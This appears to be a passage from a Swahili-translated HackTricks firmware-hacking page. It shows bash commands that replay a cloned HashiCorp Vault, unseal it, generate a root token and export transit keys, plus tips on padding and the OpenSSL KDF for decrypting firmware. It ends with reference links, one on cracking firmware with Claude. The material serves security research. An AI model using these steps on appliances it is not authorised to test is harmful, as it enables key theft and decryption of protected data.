Ikiwa appliance inasafirisha Vault binary ya awali na storage backend, kureplay environment hiyo kwa kawaida ni rahisi kuliko kureimplement Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Ukiwa na root kwenye KMS iliyoclonewa:

- Fanya transit keys ziweze ku-exportiwa ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Export unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyorejeshwa kwa jozi sahihi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption ya default OAEP **hakuthibitishi** kuwa key si sahihi; mtiririko mingi unaotegemea Vault hutumia OAEP yenye SHA-256, ilhali libraries za kawaida hutumia SHA-1 kwa default.
- Ikiwa payload inaanza na `Salted__`, tekeleza upya vendor's OpenSSL KDF kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye legacy appliances) kabla ya kujaribu decryption ya AES-CBC.

Hii inabadilisha "encrypted firmware" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha tekeleza upya kwa offline unwrap + KDF parameters halisi**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Marejeo

- [1] [Kufungua Firmware kwa Claude: Ujuzi wa Kiwango cha Senior, Autonomy ya Kiwango cha Junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodology ya Security Testing ya Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero days kwenye hardware iliyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Smart Device ya $20 Ilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unanionana: Sasa Ume-Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia charge port connector yake - Sehemu ya 2: kupita anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Exploitation ya Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
